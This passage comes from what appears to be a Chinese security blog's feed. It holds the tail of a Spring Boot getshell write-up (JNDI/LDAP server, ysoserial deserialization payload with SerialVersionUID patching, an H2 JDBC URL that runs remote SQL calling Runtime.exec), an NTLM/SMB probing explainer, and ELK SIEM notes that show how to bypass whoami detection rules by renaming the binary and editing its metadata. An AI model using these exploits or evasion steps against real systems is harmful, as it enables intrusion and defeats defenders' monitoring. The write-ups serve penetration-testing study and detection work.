HackerLDAPRefServer  <span class="token number">0.0</span>.0.0 <span class="token number">8088</span> <span class="token number">1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/from-spring-boot-to-getshell/4.jpg"></p><p>但是在使用CommonsBeanutils1链的时候，执行命令失败:<br><img src="/2022/03/18/from-spring-boot-to-getshell/3.png"><br>可以从报错原因看出来，因为CommonsBeanutils1的版本不同，BeanComparator这个类的<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java#L119">SerialVersionUID不一样</a>，会造成反序列化失败。1.7x-1.8x为<code>-3490850999041592962</code>,1.9x为<code>-2044202215314119608</code>。<br>有两种解决方法：</p><ul><li>替换ysoserial的CommonsBeanutils1，使用<a href="https://github.com/su18/ysoserial">su18师傅的ysoserial</a>: <code>java -jar ysuserial-1.3-su18-all.jar -g CommonsBeanutils1183NOCC -p &#39;open -a Calculator.app&#39; |base64 |pbcopy</code></li><li>生成反序列化数据之后，<a href="https://github.com/phith0n/zkar">修改SerialVersionUID</a>为对应版本的值</li></ul><p>刚好早上看到P师傅发的文章，尝试使用<a href="https://github.com/phith0n/zkar">zkar</a>修改ysoserial生成的序列化数据包，可以执行命令成功。</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/phith0n/zkar/serz"</span><span class="token string">"io/ioutil"</span><span class="token string">"log"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>data<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"cb1.ser"</span><span class="token punctuation">)</span>serialization<span class="token punctuation">,</span> err <span class="token operator">:=</span> serz<span class="token punctuation">.</span><span class="token function">FromBytes</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span><span class="token string">"parse error"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>object <span class="token operator">:=</span> serialization<span class="token punctuation">.</span>Contents<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Object<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> field <span class="token operator">:=</span> <span class="token keyword">range</span> object<span class="token punctuation">.</span>ClassDatas<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>FieldDatas <span class="token punctuation">&#123;</span><span class="token keyword">if</span> field<span class="token punctuation">.</span>TypeCode <span class="token operator">==</span> <span class="token string">"L"</span> <span class="token punctuation">&#123;</span>classPonter <span class="token operator">:=</span> field<span class="token punctuation">.</span>Object<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token operator">*</span>serz<span class="token punctuation">.</span>TCObject<span class="token punctuation">)</span><span class="token punctuation">.</span>ClassPointer<span class="token keyword">if</span> classPonter<span class="token punctuation">.</span>Flag <span class="token operator">==</span> serz<span class="token punctuation">.</span>JAVA_TC_CLASSDESC <span class="token operator">&amp;&amp;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>ClassName<span class="token punctuation">.</span>Data <span class="token operator">==</span> <span class="token string">"org.apache.commons.beanutils.BeanComparator"</span> <span class="token punctuation">&#123;</span>classPonter<span class="token punctuation">.</span>NormalClassDesc<span class="token punctuation">.</span>SerialVersionUID <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">3490850999041592962</span><span class="token keyword">break</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"cb1-modify.ser"</span><span class="token punctuation">,</span> serialization<span class="token punctuation">.</span><span class="token function">ToBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0o755</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="H2-RCE"><a href="#H2-RCE" class="headerlink" title="H2 RCE"></a>H2 RCE</h3><p>参考su18师傅的<a href="https://su18.org/post/jdbc-connection-url-attack/#h2-rce">jdbc-connection-url-attack</a>：</p><pre class="line-numbers language-none"><code class="language-none">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;poc.sql&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>远程服务器的恶意SQL:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ALIAS <span class="token keyword">EXEC</span> <span class="token keyword">AS</span> <span class="token string">'String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return "su18";&#125;'</span><span class="token punctuation">;</span><span class="token keyword">CALL</span> <span class="token keyword">EXEC</span> <span class="token punctuation">(</span><span class="token string">'open -a Calculator.app'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Spring &lt; 2.3.0的时候，会默认创建<code>jdbc:h2:mem:testdb</code>，Spring &gt;= 2.3.0的时候，Spring会自动创建一个UUID随机数据库名，数据库名可以在Spirng的日志里看到。</p><p>所以使用这种方法的时候需要满足以下任意一个条件：</p><ul><li>Spring &lt; 2.3.0</li><li>提前获取到H2 database的用户密码</li></ul><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>RMI托管在VPS的时候，修改<a href="https://github.com/JKme/EvilRMI/blob/main/src/main/java/com/rmi/RmiServer.java#L180">java.rmi.server.hostname</a>为自己服务器的IP地址</li><li>在完全黑盒的情况下，注意SerialVersionUID不匹配的问题，具体见<a href="https://github.com/kezibei/Urldns/blob/ea7774f9f1e6b1d64000228e82ed33a2f5a252dd/src/main/en.java">URLDNS</a></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://81.68.118.217/index.php/archives/62/">JNDI注入高版本绕过</a></li><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li><li><a href="http://wjlshare.com/archives/1575">ysoserial 工具改造</a></li><li><a href="https://github.com/phith0n/zkar">zkar</a></li><li><a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li><li><a href="https://su18.org/post/jdbc-connection-url-attack">jdbc-connection-url-attack</a></li><li><a href="https://github.com/JKme/EvilRMI">https://github.com/JKme/EvilRMI</a></li><li><a href="https://github.com/su18/ysoserial">推荐使用su18是否的ysoserial</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NTLM端口信息探测</title>
      <link href="/2021/08/06/windows-ntlm-smb-scan.html"/>
      <url>/2021/08/06/windows-ntlm-smb-scan.html</url>
      
        <content type="html"><![CDATA[<p>SMB（Server Message Block）协议，可用于在计算机间共享文件、打印机、串口等，电脑上的网上邻居就是靠它实现的。SMB使用了NetBIOS的应用程序接口 （Application Program Interface，简称API）。另外，它是一个开放性的协议，允许了协议扩展——使得它变得更大而且复杂；大约有65个最上层的作业，而每个作业都超过120个函数，甚至Windows NT也没有全部支持到，最近微软又把 SMB 改名为 CIFS（Common Internet File System），并且加入了许多新的特色。SMB协议一般端口使用为139，445，CIFS协议有三个版本：SMB、SMB2、SMB3。</p><h3 id="NTLM"><a href="#NTLM" class="headerlink" title="NTLM"></a>NTLM</h3><p>在type2返回Challenge的过程中，同时返回了操作系统类型，主机名，netbios名等等。这也就意味着如果我们在能跟服务器进行NTLM交流中，给服务器发送一个type1的请求，服务器返回type2的响应，这一步，我们就可以得到很多信息。SMBv1和SMBv2的数据包结构是不同的</p><h3 id="SMBv1"><a href="#SMBv1" class="headerlink" title="SMBv1"></a>SMBv1</h3><p>使用<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>探测SMB接口，抓包通过wireshark分析，包含操作系统类型的数据包由SMB Header和Response组成：<br><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-1.png"><br>我们的目的是获取smb数据包的NTLM数据，然后对NTLM数据包解析，NTLM数据包上一层是GSS-API，首先找到GSS-API在整个数据包的偏移量，SMB的数据包结构长度如下：</p><pre class="line-numbers language-none"><code class="language-none">SMB Header:  32 byteWord Count:  1 byteAndXCommand: 1 byteReserved:    1 byteAndXOffset:  2 byteAction:    2 byteSecurity Blob Length: 2 byte (表示Security Blob的长度，这里的hex是 0f 10，小端转换为010f,再转换成10进制就是271，对应Security Blob的长度)Byte Count: 2 byte (表示Security Blob加上NativeOS和Native Lan的长度)Security Blob: 可变长度，取决于Security Blob Length<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的数据包结构的关键数据是<code>Security Blob Length</code>和<code>Byte Content</code>，前者表示GSS-API的整个数据包长度，后者表示GSS-API和Native OS加上Native LM的数据长度：</p><h6 id="GSS-API的长度是271-Byte"><a href="#GSS-API的长度是271-Byte" class="headerlink" title="GSS-API的长度是271 Byte"></a>GSS-API的长度是271 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.png"></p><h6 id="Native-OS的长度是42-Byte"><a href="#Native-OS的长度是42-Byte" class="headerlink" title="Native OS的长度是42 Byte"></a>Native OS的长度是42 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.1.png"></p><h6 id="Native-LM的长度是38-Byte"><a href="#Native-LM的长度是38-Byte" class="headerlink" title="Native LM的长度是38 Byte"></a>Native LM的长度是38 Byte</h6><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-3.2.png"></p><p>所以数学题来了：<br>Security Blob Length转换成10进制是271 Byte</p><p>Byte Count: 271 + 42 + 38 = 351 Byte<br>我们的目的是获取NTLM的数据和NativeOS和Native LM，回到代码里面去看看，当我们获取到type2的数据，获取到的数据是什么呢？</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-4.png"></p><p>NetBIOS Session Service这一层的长度是4 Byte，<code>Security Blob Length</code>的偏移量就出来了: </p><pre class="line-numbers language-none"><code class="language-none">4 + 32 + 1 + 1 + 1 + 2 + 2 &#x3D; 43<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以<code>Security Blob Length</code>偏移从43开始，长度是2 Byte， <code>Security Blob</code>跟在后面，偏移从45开始，47结束，go语言伪代码：</p><pre class="line-numbers language-none"><code class="language-none">blob_length :&#x3D; uint16(bytes2Uint(ret[43:45], &#39;&lt;&#39;))blob_count :&#x3D; uint16(bytes2Uint(ret[45:47], &#39;&lt;&#39;))&#x2F;&#x2F;gss变量表示从Security Blob起始位置到数据包结束，包括了Native OS和Native LMgss :&#x3D; ret[47:]&#x2F;&#x2F;找到NTLMSSP在gss的偏移起始位置off_ntlm :&#x3D; bytes.Index(gss, []byte(&quot;NTLMSSP&quot;))&#x2F;&#x2F;Native OS和Native LM数据，对应上面的图native :&#x3D; gss[int(blob_length):blob_count]&#x2F;&#x2F;bs表示ntlm的数据，以NTLMSSP开头bs :&#x3D; gss[off_ntlm:blob_length]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来主要工作就是解析NTLM的数据，感谢iv4n师傅的<a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a>，我fork了一份<a href="https://github.com/JKme/go-ntlmssp">go-ntlmssp</a>，增加了解析NTLM输出字符串函数，可以直接获取NTLMSSP数据的解析结果：</p><pre class="line-numbers language-none"><code class="language-none">func TestChallengeMsg_String(t *testing.T) &#123;bs, _ :&#x3D; hex.DecodeString(&quot;4e544c4d535350xxxxx&quot;)type2 :&#x3D; ChallengeMsg&#123;&#125;info :&#x3D; type2.String(bs)fmt.Println(info)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-5.png"></p><p>Windows10默认使用SMBv2协议，没有打开SMBv1开关，<a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a>只发送了SMBv1的探测，没有探测SMBv2。<a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a>师傅就比较完整，先探测SMBv1，失败之后尝试SMBv2。</p><h3 id="SMBv2"><a href="#SMBv2" class="headerlink" title="SMBv2"></a>SMBv2</h3><p>参考<a href="https://github.com/FeigongSec/NTLMINFO/blob/016e1859b7c0f4cc55c923027bc24174b0586bc7/SmbInfo/SmbInfo/Program.cs#L83">非攻师傅的代码</a>，先发送第一次的探测请求，找到偏移量70的地方，做一次判断是否发送第二个数据包。换成GO代码就比较简单了，这里的偏移70保存的是是SMBv2的<code>Security mode</code>:</p><p><img src="/2021/08/06/windows-ntlm-smb-scan/ntlm-6.png"></p><p>Go语言如下：</p><pre class="line-numbers language-none"><code class="language-none">var NTLMSSPNegotiatev2Data []byteif hex.EncodeToString(r2[70:71]) &#x3D;&#x3D; &quot;03&quot; &#123;flags :&#x3D; []byte&#123;0x15, 0x82, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125; else &#123;flags :&#x3D; []byte&#123;0x05, 0x80, 0x08, 0xa0&#125;NTLMSSPNegotiatev2Data &#x3D; getNTLMSSPNegotiateData(flags)&#125;_, err &#x3D; conn2.Write(NegotiateSMBv2Data2)if err !&#x3D; nil &#123;return&#125;readBytes(conn2)_, err &#x3D; conn2.Write(NTLMSSPNegotiatev2Data)ret, _ :&#x3D; readBytes(conn2)ntlmOff :&#x3D; bytes.Index(ret, []byte(&quot;NTLMSSP&quot;))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成品主要参考非攻师傅的代码，集成到<a href="https://github.com/JKme/cube">Cube</a>，完成了winrm、wmi、smb、mssql端口的NTLM信息探测。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://github.com/FeigongSec/NTLMINFO">非攻NTLMINFO</a></li><li><a href="https://github.com/RowTeam/SharpDetectionNTLMSSP">Rcoll师傅的SharpDetectionNTLMSSP</a></li><li><a href="https://github.com/zmap/zgrab2/tree/master/lib/smb/smb">An SMB library in Go</a></li><li><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/4">NTLM基础介绍</a></li><li><a href="http://iv4n.cc/ntlmssp/">Windows NTLM协议细节</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688">Server Message Block (SMB) Protocol</a></li><li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5606ad47-5ee0-437a-817e-70c366052962">Server Message Block (SMB) Protocol Versions 2 and 3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SIEM On ELK</title>
      <link href="/2021/08/02/siem-on-elk.html"/>
      <url>/2021/08/02/siem-on-elk.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>参考链接里有详细的安装步骤，测试客户端是Windows，安装了如下软件：</p><ul><li>sysmon.exe(<a href="https://github.com/SwiftOnSecurity/sysmon-config">配置文件</a>)<ul><li><code>.\sysmon64.exe -accepteula -i c:\windows\config.xml</code></li></ul></li><li>winlogbeat.exe<ul><li><code>.\install-service-winlogbeat.ps1</code></li><li><code>.\winlogbeat.exe setup -e</code></li></ul></li><li>ElasticAgent.exe<ul><li><code>.\elastic-agent.exe install  --insecure -f --fleet-server-es=&lt;ES&gt; --fleet-server-service-token=&lt;token&gt;</code></li></ul></li></ul><h3 id="规则监测和绕过"><a href="#规则监测和绕过" class="headerlink" title="规则监测和绕过"></a>规则监测和绕过</h3><p>规则有5种查询，一般使用EQL(Event Query Language)查询类型:<br><img src="/2021/08/02/siem-on-elk/siem-1.png"><br>SIEM有内置很多规则，默认是关闭状态，这些规则都是ATT&amp;CK框架攻击行为转化而来的，例如windows下的<code>whoami</code>查询规则(<del>正经人谁查whoami啊</del>):</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.name : &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们拿这条规则做分析，这条规则匹配了当进程开始的时候，进程名为<code>whoami.exe</code>的时候触发，所以我们把<code>whoami.exe</code>复制一下，就可以绕过去了:</p><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exeC:\Windows\temp\x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是不是把siem想的简单了，这跟通过复制<code>net.exe</code>绕过添加用户一模一样，仔细观察下elk里面的字段，可以发现<code>process.pe.original_file_name</code>仍然保留了<code>whoami.exe</code>，这是PE文件里面固定的，所以我们手动把预警规则修改一下:</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and process.pe.original_file_name: &quot;whoami.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时通过复制绕过就失效了，那么<code>process.pe.original_file_name</code>能不能改呢？可以的，<a href="https://github.com/electron/rcedit/releases">rcedit</a>:</p><pre class="line-numbers language-none"><code class="language-none">cedit-x64.exe x.exe --set-version-string  OriginalFilename &quot;hello.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-2.png"></p><p>此时再次执行<code>x.exe</code>，SIEM里面不会有告警信息，所以可以通过这种形式绕过和<code>process.pe.original_file_name</code>相关的规则，所以在实际过程中，要从多个维度思考，比如network、注册表、事件ID</p><h3 id="告警通知"><a href="#告警通知" class="headerlink" title="告警通知"></a>告警通知</h3><p>ELK的基础版没有用户通知的功能，需要开通白金版，可以申请试用30天或者破解，如果想通知钉钉，可以选择webhook的方式，在webhook的时候注意添加一个请求头字段:<code>Content-Type: application/x-wwww-form-data</code>，Action里面增加body格式:</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;#context.alerts&#125;&#125;timestamp&#x3D;&#123;&#123;@timestamp&#125;&#125;&amp;rule_name&#x3D;&#123;&#123;context.rule.name&#125;&#125;&amp;risk_score&#x3D;&#123;&#123;context.rule.risk_score&#125;&#125;&amp;host_name&#x3D;&#123;&#123;host.name&#125;&#125;&amp;process_parent_name&#x3D;&#123;&#123;process.parent.name&#125;&#125;&amp;process_command_line&#x3D;&#123;&#123;process.command_line&#125;&#125;&amp;process_name&#x3D;&#123;&#123;process.name&#125;&#125;&amp;user_name&#x3D;&#123;&#123;user.name&#125;&#125;&amp;result_link&#x3D;&#123;&#123;&#123;context.results_link&#125;&#125;&#125;&#123;&#123;&#x2F;context.alerts&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>服务端解析body然后通知钉钉：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> jsonify<span class="token keyword">from</span> datetime <span class="token keyword">import</span> datetime<span class="token punctuation">,</span> timedeltaapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    form <span class="token operator">=</span> request<span class="token punctuation">.</span>form    <span class="token keyword">print</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> date2local<span class="token punctuation">(</span>form<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    rule_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"rule_name"</span><span class="token punctuation">]</span>    <span class="token comment"># risk_score = form["risk_score"]</span>    host_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"host_name"</span><span class="token punctuation">]</span>    process_parent_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_parent_name"</span><span class="token punctuation">]</span>    process_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_name"</span><span class="token punctuation">]</span>    process_command_line <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"process_command_line"</span><span class="token punctuation">]</span>    user_name <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"user_name"</span><span class="token punctuation">]</span>    result_link <span class="token operator">=</span> form<span class="token punctuation">[</span><span class="token string">"result_link"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token string">"%0a"</span><span class="token punctuation">)</span>    dingTalk_notify<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token string">"OK"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">date2local</span><span class="token punctuation">(</span>date<span class="token punctuation">)</span><span class="token punctuation">:</span>    date <span class="token operator">=</span> datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>date<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%dT%H:%M:%S.%fZ"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>date <span class="token operator">+</span> timedelta<span class="token punctuation">(</span>hours<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">"%Y-%m-%d %H:%M:%S"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dingTalk_notify</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> rule_name<span class="token punctuation">,</span> host_name<span class="token punctuation">,</span> process_parent_name<span class="token punctuation">,</span> process_name<span class="token punctuation">,</span> process_command_line<span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> result_link<span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> <span class="token string">""</span>      ddrobot <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://oapi.dingtalk.com/robot/send?access_token=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json;charset=utf-8'</span>    <span class="token punctuation">&#125;</span>    json_text <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"msgtype"</span><span class="token punctuation">:</span> <span class="token string">"markdown"</span><span class="token punctuation">,</span>        <span class="token string">"markdown"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"title"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"SIEM告警"</span></span><span class="token punctuation">,</span>            <span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"### SIEM告警通知\n##### 触发时间: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>timestamp<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 触发规则: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>rule_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 触发主机: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>host_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 关联父进程: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_parent_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 当前进程: "</span></span>                    <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_name<span class="token punctuation">&#125;</span></span><span class="token string">\n#### 进程参数：</span><span class="token interpolation"><span class="token punctuation">&#123;</span>process_command_line<span class="token punctuation">&#125;</span></span><span class="token string">\n##### 当前用户: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_name<span class="token punctuation">&#125;</span></span><span class="token string">\n##### [告警详情](</span><span class="token interpolation"><span class="token punctuation">&#123;</span>result_link<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token string">"at"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"atMobiles"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">"isAtAll"</span><span class="token punctuation">:</span> <span class="token string">"false"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>ddrobot<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>json_text<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> threaded<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/08/02/siem-on-elk/siem-3.png"></p><h3 id="规则示例"><a href="#规则示例" class="headerlink" title="规则示例"></a>规则示例</h3><p>SIEM内置的规则有很多，常用的规则打开的有如下几个:<br>规则名称：Conhost Spawned By Suspicious Parent Process<br>规则介绍：Console Window Host (conhost.exe)作为子进程被启动，通常是在代码注入进程的时候出现</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.name : &quot;conhost.exe&quot; and  process.parent.name : (&quot;svchost.exe&quot;, &quot;lsass.exe&quot;, &quot;services.exe&quot;, &quot;smss.exe&quot;, &quot;winlogon.exe&quot;, &quot;explorer.exe&quot;,                         &quot;dllhost.exe&quot;, &quot;rundll32.exe&quot;, &quot;regsvr32.exe&quot;, &quot;userinit.exe&quot;, &quot;wininit.exe&quot;, &quot;spoolsv.exe&quot;,                         &quot;wermgr.exe&quot;, &quot;csrss.exe&quot;, &quot;ctfmon.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Encoding or Decoding Files via CertUtil<br>规则介绍：通过CertUtil编码解码文件</p><pre class="line-numbers language-none"><code class="language-none">process where event.type &#x3D;&#x3D; &quot;start&quot; and  (process.name : &quot;certutil.exe&quot; or process.pe.original_file_name &#x3D;&#x3D; &quot;CertUtil.exe&quot;) and  process.args : (&quot;?decode&quot;, &quot;?encode&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>规则名称：Unusual Child Processes of 